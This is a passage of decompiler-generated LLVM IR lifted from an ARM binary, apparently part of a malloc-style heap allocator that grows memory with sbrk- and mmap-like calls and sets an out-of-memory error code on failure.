  %v0_11bc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11bc4 = load i32, i32* %r3.global-to-local, align 4
  %v2_11bc4 = add i32 %v1_11bc4, %v0_11bc4
  store i32 %v2_11bc4, i32* %r1.global-to-local, align 4
  %v1_11bc8 = load i32, i32* %r2.global-to-local, align 4
  %v0_11bcc = load i32, i32* %lr.global-to-local, align 4
  %v1_11bcc = add i32 %v0_11bcc, 8
  store i32 %v1_11bcc, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_11bc4, %v1_11bc8
  br i1 %tmp213, label %bb151, label %dec_label_pc_11ed8

bb151:                                            ; preds = %bb150
  %v5_11bd0 = load i32, i32* %ip.global-to-local, align 4
  %v6_11bd0 = add i32 %v5_11bd0, 884
  %v7_11bd0 = inttoptr i32 %v6_11bd0 to i32*
  store i32 %v2_11bc4, i32* %v7_11bd0, align 4
  br label %dec_label_pc_11ed8

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11b1c, %dec_label_pc_11afc, %dec_label_pc_11b30.dec_label_pc_11bd8_crit_edge, %dec_label_pc_11b0c
  %v1_11bfc = phi i32 [ %v1_11bfc.pre, %dec_label_pc_11b30.dec_label_pc_11bd8_crit_edge ], [ %v0_11aa4, %dec_label_pc_11b0c ], [ %v0_11aa4, %dec_label_pc_11afc ], [ %v0_11aa4, %dec_label_pc_11b1c ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %ip.global-to-local, align 4
  %v4_11be0 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11be0, i32* %r3.global-to-local, align 4
  %v1_11be4 = add i32 %v4_11be0, 44
  %v2_11be4 = inttoptr i32 %v1_11be4 to i32*
  %v3_11be4 = load i32, i32* %v2_11be4, align 4
  store i32 %v3_11be4, i32* %r0.global-to-local, align 4
  %v1_11be8 = add i32 %v4_11be0, 864
  %v2_11be8 = inttoptr i32 %v1_11be8 to i32*
  %v3_11be8 = load i32, i32* %v2_11be8, align 4
  store i32 %v3_11be8, i32* %r2.global-to-local, align 4
  %v1_11bec = add i32 %v4_11be0, 840
  %v2_11bec = inttoptr i32 %v1_11bec to i32*
  %v3_11bec = load i32, i32* %v2_11bec, align 4
  store i32 %v3_11bec, i32* %r3.global-to-local, align 4
  %v1_11bf0 = add i32 %v3_11be4, 4
  %v2_11bf0 = inttoptr i32 %v1_11bf0 to i32*
  %v3_11bf0 = load i32, i32* %v2_11bf0, align 4
  store i32 %v3_11bf0, i32* %r1.global-to-local, align 4
  %v1_11bf8 = urem i32 %v3_11be8, 2
  %v2_11bf8 = icmp eq i32 %v1_11bf8, 0
  %v1_11bf4 = add i32 %v1_11bfc, 16
  %v2_11bfc = add i32 %v1_11bf4, %v3_11bec
  store i32 %v2_11bfc, i32* %r3.global-to-local, align 4
  %v1_11c00 = and i32 %v3_11bf0, -4
  store i32 %v1_11c00, i32* @r8, align 4
  br i1 %v2_11bf8, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_11bd8
  %v3_11c04 = sub i32 %v2_11bfc, %v1_11c00
  store i32 %v3_11c04, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_11bd8, %bb152
  %v0_11c08 = phi i32 [ %v2_11bfc, %dec_label_pc_11bd8 ], [ %v3_11c04, %bb152 ]
  %v1_11c08 = load i32, i32* %sb.global-to-local, align 4
  %v2_11c08 = add i32 %v1_11c08, %v0_11c08
  store i32 %v2_11c08, i32* %r3.global-to-local, align 4
  %v1_11c0c = sub i32 -1, %v1_11c08
  store i32 %v1_11c0c, i32* %fp.global-to-local, align 4
  %v2_11c10 = and i32 %v2_11c08, %v1_11c0c
  store i32 %v2_11c10, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_11c10, 1
  br i1 %tmp154, label %dec_label_pc_11c34, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %bb153
  store i32 %v2_11c10, i32* %r0.global-to-local, align 4
  %v1_11c24 = call i32 @function_13b78(i32 %v2_11c10)
  store i32 %v1_11c24, i32* %r0.global-to-local, align 4
  %v3_11c28 = icmp eq i32 %v1_11c24, -1
  store i32 %v1_11c24, i32* @r4, align 4
  br i1 %v3_11c28, label %dec_label_pc_11c34, label %dec_label_pc_11ca0

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11c20, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  %v4_11c3c = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11c3c, i32* %r6.global-to-local, align 4
  %v1_11c40 = add i32 %v4_11c3c, 864
  %v2_11c40 = inttoptr i32 %v1_11c40 to i32*
  %v3_11c40 = load i32, i32* %v2_11c40, align 4
  store i32 %v3_11c40, i32* %r3.global-to-local, align 4
  %v1_11c44 = urem i32 %v3_11c40, 2
  %v2_11c44 = icmp eq i32 %v1_11c44, 0
  br i1 %v2_11c44, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_11c34
  %v1_11c48 = load i32, i32* @r8, align 4
  %v2_11c48 = load i32, i32* %sb.global-to-local, align 4
  %v3_11c48 = add i32 %v2_11c48, %v1_11c48
  %v2_11c4c = load i32, i32* @r5, align 4
  %v3_11c4c = add i32 %v3_11c48, %v2_11c4c
  store i32 %v3_11c4c, i32* %r3.global-to-local, align 4
  %v2_11c50 = load i32, i32* %fp.global-to-local, align 4
  %v3_11c50 = and i32 %v2_11c50, %v3_11c4c
  store i32 %v3_11c50, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_11c34
  %v0_11c54.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_11c54 = phi i32 [ %v0_11c54.pr, %.thread29thread-pre-split ], [ %v3_11c50, %bb155 ]
  %v2_11c54 = icmp ugt i32 %v0_11c54, 1048575
  br i1 %v2_11c54, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_11c6c = phi i32 [ %v0_11c54, %.thread29 ], [ 1048576, %bb156 ]
  %v1_11c5c = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_11c6c, %v1_11c5c
  br i1 %tmp214, label %dec_label_pc_11c64, label %dec_label_pc_11ec8

dec_label_pc_11c64:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_11c6c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11c80 = call i32 @function_138ec(i32 0, i32 %v0_11c6c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11c80, i32* %r0.global-to-local, align 4
  %v3_11c84 = icmp eq i32 %v6_11c80, -1
  %v8_11c84 = icmp eq i32 %v6_11c80, -1
  store i32 %v6_11c80, i32* @r4, align 4
  br i1 %v8_11c84, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_11c64
  %v1_11c8c = load i32, i32* %r6.global-to-local, align 4
  %v2_11c8c = add i32 %v1_11c8c, 864
  %v3_11c8c = inttoptr i32 %v2_11c8c to i32*
  %v4_11c8c = load i32, i32* %v3_11c8c, align 4
  %v2_11c90 = load i32, i32* @r5, align 4
  %v3_11c90 = add i32 %v2_11c90, %v6_11c80
  store i32 %v3_11c90, i32* %r0.global-to-local, align 4
  %v2_11c94 = and i32 %v4_11c8c, -2
  store i32 %v2_11c94, i32* %r3.global-to-local, align 4
  store i32 %v2_11c94, i32* %v3_11c8c, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_11c64, %bb158
  br i1 %v3_11c84, label %dec_label_pc_11ca0, label %dec_label_pc_11ca4

dec_label_pc_11ca0:                               ; preds = %.thread32, %dec_label_pc_11c20
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ca4

dec_label_pc_11ca4:                               ; preds = %.thread32, %dec_label_pc_11ca0
  %v0_11ca4 = load i32, i32* @r4, align 4
  %v7_11ca4 = icmp eq i32 %v0_11ca4, -1
  br i1 %v7_11ca4, label %dec_label_pc_11ec8, label %dec_label_pc_11cac

dec_label_pc_11cac:                               ; preds = %dec_label_pc_11ca4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r2.global-to-local, align 4
  %v4_11cb4 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11cb4, i32* %ip.global-to-local, align 4
  store i32 %v3_11be4, i32* %r2.global-to-local, align 4
  %v1_11cbc = add i32 %v4_11cb4, 872
  %v2_11cbc = inttoptr i32 %v1_11cbc to i32*
  %v3_11cbc = load i32, i32* %v2_11cbc, align 4
  %v1_11cc0 = load i32, i32* @r8, align 4
  %v2_11cc0 = add i32 %v1_11cc0, %v3_11be4
  store i32 %v2_11cc0, i32* %r1.global-to-local, align 4
  %v0_11cc4 = load i32, i32* @r5, align 4
  %v2_11cc4 = add i32 %v0_11cc4, %v3_11cbc
  store i32 %v2_11cc4, i32* %r3.global-to-local, align 4
  %v9_11cc8 = icmp eq i32 %v0_11ca4, %v2_11cc0
  br i1 %v9_11cc8, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_11cac
  store i32 %v2_11cc4, i32* %v2_11cbc, align 4
  br label %dec_label_pc_11ce4

bb159:                                            ; preds = %dec_label_pc_11cac
  %v1_11ccc = load i32, i32* %r0.global-to-local, align 4
  %v8_11ccc = icmp eq i32 %v1_11ccc, -1
  store i32 %v2_11cc4, i32* %v2_11cbc, align 4
  br i1 %v8_11ccc, label %.thread34, label %dec_label_pc_11ce4

.thread34:                                        ; preds = %bb159
  %v1_11cd4 = load i32, i32* @r5, align 4
  %v2_11cd4 = load i32, i32* @r8, align 4
  %v3_11cd4 = add i32 %v2_11cd4, %v1_11cd4
  %v2_11cd8 = or i32 %v3_11cd4, 1
  store i32 %v2_11cd8, i32* %r3.global-to-local, align 4
  %v2_11cdc = load i32, i32* %r2.global-to-local, align 4
  %v3_11cdc = add i32 %v2_11cdc, 4
  %v4_11cdc = inttoptr i32 %v3_11cdc to i32*
  store i32 %v2_11cd8, i32* %v4_11cdc, align 4
  br label %dec_label_pc_11e5c

dec_label_pc_11ce4:                               ; preds = %bb159, %.thread122
  %v0_11ce8.pr = load i32, i32* @r8, align 4
  %v0_11ce4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ce4 = add i32 %v0_11ce4, 864
  %v2_11ce4 = inttoptr i32 %v1_11ce4 to i32*
  %v3_11ce4 = load i32, i32* %v2_11ce4, align 4
  store i32 %v3_11ce4, i32* %r2.global-to-local, align 4
  %v2_11ce8 = icmp eq i32 %v0_11ce8.pr, 0
  br i1 %v2_11ce8, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_11ce4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_11ce4
  %v2_11cf0 = urem i32 %v3_11ce4, 2
  store i32 %v2_11cf0, i32* %r3.global-to-local, align 4
  %v2_11cf4 = icmp eq i32 %v2_11cf0, 0
  br i1 %v2_11cf4, label %.thread40, label %dec_label_pc_11cfc

dec_label_pc_11cfc:                               ; preds = %.thread36
  %v0_11cfc = load i32, i32* @r4, align 4
  %v1_11cfc = load i32, i32* %r1.global-to-local, align 4
  %v3_11cfc = icmp ult i32 %v0_11cfc, %v1_11cfc
  br i1 %v3_11cfc, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_11cfc
  %v2_11d00 = and i32 %v3_11ce4, -2
  store i32 %v2_11d00, i32* %r3.global-to-local, align 4
  store i32 %v2_11d00, i32* %v2_11ce4, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_11cfc, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %ip.global-to-local, align 4
  %v4_11d10 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11d10, i32* @r7, align 4
  %v1_11d14 = add i32 %v4_11d10, 864
  %v2_11d14 = inttoptr i32 %v1_11d14 to i32*
  %v3_11d14 = load i32, i32* %v2_11d14, align 4
  store i32 %v3_11d14, i32* %r3.global-to-local, align 4
  %v1_11d18 = urem i32 %v3_11d14, 2
  store i32 %v1_11d18, i32* @r6, align 4
  %v2_11d18 = icmp eq i32 %v1_11d18, 0
  br i1 %v2_11d18, label %dec_label_pc_11dac, label %dec_label_pc_11d20

dec_label_pc_11d20:                               ; preds = %.thread40
  %v0_11d20 = load i32, i32* @r8, align 4
  %v2_11d20 = icmp eq i32 %v0_11d20, 0
  br i1 %v2_11d20, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_11d20
  %v2_11d24 = add i32 %v4_11d10, 872
  %v3_11d24 = inttoptr i32 %v2_11d24 to i32*
  %v4_11d24 = load i32, i32* %v3_11d24, align 4
  store i32 %v4_11d24, i32* %r2.global-to-local, align 4
  %v1_11d28 = load i32, i32* %r1.global-to-local, align 4
  %v2_11d28 = load i32, i32* @r4, align 4
  %v3_11d28 = sub i32 %v2_11d28, %v1_11d28
  %v3_11d2c = add i32 %v3_11d28, %v4_11d24
  store i32 %v3_11d2c, i32* %r3.global-to-local, align 4
  store i32 %v3_11d2c, i32* %v3_11d24, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_11d20, %bb161
  %v0_11d34 = load i32, i32* @r4, align 4
  %v1_11d34 = urem i32 %v0_11d34, 8
  store i32 %v1_11d34, i32* %r3.global-to-local, align 4
  %v2_11d34 = icmp eq i32 %v1_11d34, 0
  br i1 %v2_11d34, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_11d38 = sub nsw i32 8, %v1_11d34
  store i32 %v2_11d38, i32* %r3.global-to-local, align 4
  %v3_11d3c = add i32 %v2_11d38, %v0_11d34
  store i32 %v3_11d3c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_11d44 = phi i32 [ 0, %.thread43 ], [ %v2_11d38, %bb162 ]
  %v1_11d40 = load i32, i32* @r5, align 4
  %v2_11d40 = add i32 %v1_11d40, %v0_11d34
  store i32 %v2_11d40, i32* @r6, align 4
  %v1_11d44 = load i32, i32* @r8, align 4
  %v2_11d44 = add i32 %v2_11d40, %v0_11d44
  %v2_11d48 = add i32 %v2_11d44, %v1_11d44
  store i32 %v2_11d48, i32* %r1.global-to-local, align 4
  %v1_11d4c = load i32, i32* %sb.global-to-local, align 4
  %v2_11d4c = add i32 %v1_11d4c, %v2_11d48
  %v1_11d50 = load i32, i32* %fp.global-to-local, align 4
  %v2_11d50 = and i32 %v1_11d50, %v2_11d4c
  store i32 %v2_11d50, i32* %r2.global-to-local, align 4
  %v2_11d54 = sub i32 0, %v2_11d40
  store i32 %v2_11d54, i32* %r3.global-to-local, align 4
  %v2_11d58 = sub i32 %v2_11d50, %v2_11d40
  store i32 %v2_11d58, i32* @r5, align 4
  store i32 %v2_11d58, i32* %r0.global-to-local, align 4
  br i1 %v2_11d34, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_11d34, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_11d64 = call i32 @function_13b78(i32 %v2_11d58)
  store i32 %v1_11d64, i32* %r0.global-to-local, align 4
  %v3_11d68 = icmp eq i32 %v1_11d64, -1
  br i1 %v3_11d68, label %dec_label_pc_11d70, label %dec_label_pc_11d80

dec_label_pc_11d70:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11d74 = call i32 @function_13b78(i32 0)
  store i32 %v1_11d74, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11dd8

dec_label_pc_11d80:                               ; preds = %bb164
  %v1_11d80 = load i32, i32* @r4, align 4
  %v3_11d80 = icmp ult i32 %v1_11d64, %v1_11d80
  br i1 %v3_11d80, label %dec_label_pc_11d88, label %dec_label_pc_11dd8

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d80
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r0.global-to-local, align 4
  %v4_11d90 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11d90, i32* %r2.global-to-local, align 4
  %v1_11d94 = add i32 %v4_11d90, 864
  %v2_11d94 = inttoptr i32 %v1_11d94 to i32*
  %v3_11d94 = load i32, i32* %v2_11d94, align 4
  %v0_11d98 = load i32, i32* @r6, align 4
  store i32 %v0_11d98, i32* %r0.global-to-local, align 4
  %v1_11d9c = and i32 %v3_11d94, -2
  store i32 %v1_11d9c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_11d9c, i32* %v2_11d94, align 4
  br label %dec_label_pc_11dd8

dec_label_pc_11dac:                               ; preds = %.thread40
  %v0_11dac = load i32, i32* %r0.global-to-local, align 4
  %v3_11dac = icmp eq i32 %v0_11dac, -1
  br i1 %v3_11dac, label %dec_label_pc_11db4, label %dec_label_pc_11dd0

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11dac
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11db8 = call i32 @function_13b78(i32 0)
  store i32 %v1_11db8, i32* %r0.global-to-local, align 4
  %v0_11dbc = load i32, i32* @r7, align 4
  %v1_11dbc = add i32 %v0_11dbc, 872
  %v2_11dbc = inttoptr i32 %v1_11dbc to i32*
  %v3_11dbc = load i32, i32* %v2_11dbc, align 4
  store i32 %v3_11dbc, i32* %r2.global-to-local, align 4
  %v0_11dc0 = load i32, i32* @r4, align 4
  %v0_11dc4 = load i32, i32* @r5, align 4
  %v2_11dc0 = add i32 %v3_11dbc, %v1_11db8
  %v2_11dc4 = sub i32 %v2_11dc0, %v0_11dc0
  %v2_11dc8 = sub i32 %v2_11dc4, %v0_11dc4
  store i32 %v2_11dc8, i32* %r3.global-to-local, align 4
  store i32 %v2_11dc8, i32* %v2_11dbc, align 4
  %v0_11dd4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11dd0

dec_label_pc_11dd0:                               ; preds = %dec_label_pc_11dac, %dec_label_pc_11db4
  %v0_11dd4 = phi i32 [ 0, %dec_label_pc_11dac ], [ %v0_11dd4.pre, %dec_label_pc_11db4 ]
  %v0_11dd0 = load i32, i32* @r4, align 4
  store i32 %v0_11dd0, i32* @r7, align 4
  store i32 %v0_11dd4, i32* @r5, align 4
  br label %dec_label_pc_11dd8

dec_label_pc_11dd8:                               ; preds = %dec_label_pc_11d80, %dec_label_pc_11d88, %dec_label_pc_11d70, %dec_label_pc_11dd0
  %v0_11dd8 = load i32, i32* %r0.global-to-local, align 4
  %v7_11dd8 = icmp eq i32 %v0_11dd8, -1
  br i1 %v7_11dd8, label %dec_label_pc_11e5c, label %dec_label_pc_11de0

dec_label_pc_11de0:                               ; preds = %dec_label_pc_11dd8
  %v1_11de0 = load i32, i32* @r5, align 4
  %v2_11de0 = add i32 %v1_11de0, %v0_11dd8
  %v0_11de4 = load i32, i32* @r7, align 4
  %v2_11de4 = sub i32 %v2_11de0, %v0_11de4
  %v1_11de8 = or i32 %v2_11de4, 1
  %v2_11dec = add i32 %v0_11de4, 4
  %v3_11dec = inttoptr i32 %v2_11dec to i32*
  store i32 %v1_11de8, i32* %v3_11dec, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11df8 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11df8, i32* @r6, align 4
  %v1_11dfc = add i32 %v4_11df8, 872
  %v2_11dfc = inttoptr i32 %v1_11dfc to i32*
  %v3_11dfc = load i32, i32* %v2_11dfc, align 4
  %v0_11e00 = load i32, i32* @r8, align 4
  %v2_11e00 = icmp eq i32 %v0_11e00, 0
  %v0_11e04 = load i32, i32* @r5, align 4
  %v2_11e04 = add i32 %v0_11e04, %v3_11dfc
  store i32 %v2_11e04, i32* %r3.global-to-local, align 4
  store i32 %v2_11e04, i32* %v2_11dfc, align 4
  %v0_11e0c = load i32, i32* @r7, align 4
  %v1_11e0c = load i32, i32* @r6, align 4
  %v2_11e0c = add i32 %v1_11e0c, 44
  %v3_11e0c = inttoptr i32 %v2_11e0c to i32*
  store i32 %v0_11e0c, i32* %v3_11e0c, align 4
  br i1 %v2_11e00, label %dec_label_pc_11e5c, label %dec_label_pc_11e14

dec_label_pc_11e14:                               ; preds = %dec_label_pc_11de0
  %v0_11e18 = load i32, i32* @r8, align 4
  %v1_11e18 = add i32 %v0_11e18, -12
  %v1_11e1c = and i32 %v1_11e18, -8
  store i32 %v3_11be4, i32* %ip.global-to-local, align 4
  %v2_11e24 = add i32 %v1_11e1c, %v3_11be4
  store i32 %v2_11e24, i32* %r1.global-to-local, align 4
  %v2_11e28 = icmp ugt i32 %v1_11e1c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_11e30 = or i32 %v1_11e1c, 1
  store i32 %v1_11e30, i32* %r3.global-to-local, align 4
  store i32 %v1_11e30, i32* %v2_11bf0, align 4
  %v0_11e38 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e38 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e38 = add i32 %v1_11e38, 8
  %v3_11e38 = inttoptr i32 %v2_11e38 to i32*
  store i32 %v0_11e38, i32* %v3_11e38, align 4
  %v0_11e3c = load i32, i32* %r2.global-to-local, align 4
  %v1_11e3c = load i32, i32* %r1.global-to-local, align 4
  %v2_11e3c = add i32 %v1_11e3c, 4
  %v3_11e3c = inttoptr i32 %v2_11e3c to i32*
  store i32 %v0_11e3c, i32* %v3_11e3c, align 4
  br i1 %v2_11e28, label %dec_label_pc_11e44, label %dec_label_pc_11e5c

dec_label_pc_11e44:                               ; preds = %dec_label_pc_11e14
  %v0_11e44 = load i32, i32* @r6, align 4
  %v1_11e44 = add i32 %v0_11e44, 836
  %v2_11e44 = inttoptr i32 %v1_11e44 to i32*
  %v3_11e44 = load i32, i32* %v2_11e44, align 4
  store i32 %v3_11e44, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11e4c = load i32, i32* %ip.global-to-local, align 4
  %v1_11e4c = add i32 %v0_11e4c, 8
  store i32 %v1_11e4c, i32* @r0, align 4
  store i32 -1, i32* %v2_11e44, align 4
  %v0_11e54 = call i32 @function_12670()
  store i32 %v0_11e54, i32* %r0.global-to-local, align 4
  %v0_11e58 = load i32, i32* @r4, align 4
  %v1_11e58 = load i32, i32* @r6, align 4
  %v2_11e58 = add i32 %v1_11e58, 836
  %v3_11e58 = inttoptr i32 %v2_11e58 to i32*
  store i32 %v0_11e58, i32* %v3_11e58, align 4
  br label %dec_label_pc_11e5c

dec_label_pc_11e5c:                               ; preds = %.thread34, %dec_label_pc_11e14, %dec_label_pc_11de0, %dec_label_pc_11dd8, %dec_label_pc_11e44
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r0.global-to-local, align 4
  %v4_11e64 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_11e64, i32* %lr.global-to-local, align 4
  %v1_11e68 = add i32 %v4_11e64, 872
  store i32 %v1_11e68, i32* %r1.global-to-local, align 4
  %v1_11e6c = inttoptr i32 %v1_11e68 to i32*
  %v2_11e6c = load i32, i32* %v1_11e6c, align 4
  store i32 %v2_11e6c, i32* %r1.global-to-local, align 4
  %v3_11e6c = add i32 %v4_11e64, 876
  %v4_11e6c = inttoptr i32 %v3_11e6c to i32*
  %v5_11e6c = load i32, i32* %v4_11e6c, align 4
  store i32 %v5_11e6c, i32* %r3.global-to-local, align 4
  %v1_11e74 = add i32 %v4_11e64, 868
  %v2_11e74 = inttoptr i32 %v1_11e74 to i32*
  %v3_11e74 = load i32, i32* %v2_11e74, align 4
  store i32 %v3_11e74, i32* %r3.global-to-local, align 4
  %v1_11e78 = add i32 %v4_11e64, 884
  %v2_11e78 = inttoptr i32 %v1_11e78 to i32*
  %v3_11e78 = load i32, i32* %v2_11e78, align 4
  store i32 %v3_11e78, i32* %r2.global-to-local, align 4
  %v2_11e7c = add i32 %v3_11e74, %v2_11e6c
  store i32 %v2_11e7c, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_11e6c, %v5_11e6c
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_11e5c
  store i32 %v2_11e6c, i32* %v4_11e6c, align 4
  %v0_11e84.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_11e84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_11e5c, %bb165
  %v1_11e84 = phi i32 [ %v3_11e78, %dec_label_pc_11e5c ], [ %v1_11e84.pre, %bb165 ]
  %v4_11e88 = phi i32 [ %v2_11e7c, %dec_label_pc_11e5c ], [ %v0_11e84.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_11e88, %v1_11e84
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_11e88 = load i32, i32* %lr.global-to-local, align 4
  %v6_11e88 = add i32 %v5_11e88, 884
  %v7_11e88 = inttoptr i32 %v6_11e88 to i32*
  store i32 %v4_11e88, i32* %v7_11e88, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_11e8c = load i32, i32* %lr.global-to-local, align 4
  %v1_11e8c = add i32 %v0_11e8c, 44
  %v2_11e8c = inttoptr i32 %v1_11e8c to i32*
  %v3_11e8c = load i32, i32* %v2_11e8c, align 4
  store i32 %v3_11e8c, i32* %ip.global-to-local, align 4
  %v1_11e90 = add i32 %v3_11e8c, 4
  %v2_11e90 = inttoptr i32 %v1_11e90 to i32*
  %v3_11e90 = load i32, i32* %v2_11e90, align 4
  store i32 %v1_11aa4, i32* %r1.global-to-local, align 4
  %v1_11e98 = and i32 %v3_11e90, -4
  store i32 %v1_11e98, i32* %r3.global-to-local, align 4
  %v3_11e9c = icmp ult i32 %v1_11e98, %v1_11aa4
  br i1 %v3_11e9c, label %dec_label_pc_11ec8, label %dec_label_pc_11ea4

dec_label_pc_11ea4:                               ; preds = %bb168
  %v0_11ea4 = load i32, i32* @sl, align 4
  %v2_11ea4 = sub i32 %v1_11e98, %v0_11ea4
  %v2_11ea8 = add i32 %v0_11ea4, %v3_11e8c
  store i32 %v2_11ea8, i32* %r1.global-to-local, align 4
  %v1_11eac = or i32 %v2_11ea4, 1
  store i32 %v1_11eac, i32* %r3.global-to-local, align 4
  %v1_11eb0 = or i32 %v0_11ea4, 1
  store i32 %v1_11eb0, i32* %r2.global-to-local, align 4
  %v1_11eb4 = add i32 %v3_11e8c, 8
  store i32 %v1_11eb4, i32* %r0.global-to-local, align 4
  store i32 %v1_11eb0, i32* %v2_11e90, align 4
  %v0_11ebc = load i32, i32* %r1.global-to-local, align 4
  %v1_11ebc = load i32, i32* %lr.global-to-local, align 4
  %v2_11ebc = add i32 %v1_11ebc, 44
  %v3_11ebc = inttoptr i32 %v2_11ebc to i32*
  store i32 %v0_11ebc, i32* %v3_11ebc, align 4
  %v0_11ec0 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ec0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ec0 = add i32 %v1_11ec0, 4
  %v3_11ec0 = inttoptr i32 %v2_11ec0 to i32*
  store i32 %v0_11ec0, i32* %v3_11ec0, align 4
  br label %dec_label_pc_11ed8

dec_label_pc_11ec8:                               ; preds = %bb157, %bb168, %dec_label_pc_11ca4
  %v0_11ec8 = call i32 @function_11008()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_11ed0 = inttoptr i32 %v0_11ec8 to i32*
  store i32 12, i32* %v2_11ed0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ed8

dec_label_pc_11ed8:                               ; preds = %bb151, %bb150, %dec_label_pc_11ea4, %dec_label_pc_11aec, %dec_label_pc_11ec8
  %v0_11ed8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ed8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %.thread1, %dec_label_pc_11ab8, %.thread121, %dec_label_pc_11928, %dec_label_pc_1191c, %dec_label_pc_11784, %dec_label_pc_11708, %dec_label_pc_11ed8
  store i32 %v2_11630, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 124088, i32* %r2.global-to-local, align 4
  %v4_11eec = load i32, i32* inttoptr (i32 124112 to i32*), align 16
  store i32 %v4_11eec, i32* @ip, align 4
  store i32 73464, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11eec)
  br label %dec_label_pc_11ef8

dec_label_pc_11ef8:                               ; preds = %dec_label_pc_11668, %dec_label_pc_11edc
  %v0_11ef8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11ef8, i32* %r0.global-to-local, align 4
  store i32 %v3_11604, i32* @r4, align 4
  store i32 %v6_11604, i32* @r5, align 4
  store i32 %v9_11604, i32* @r6, align 4
  store i32 %v12_11604, i32* @r7, align 4
  store i32 %v15_11604, i32* @r8, align 4
  store i32 %v18_11604, i32* @sb, align 4
  store i32 %v21_11604, i32* @sl, align 4
  store i32 %v24_11604, i32* @fp, align 4
  store i32 %v27_11604, i32* @lr, align 4
  ret i32 %v0_11ef8

; uselistorder directives
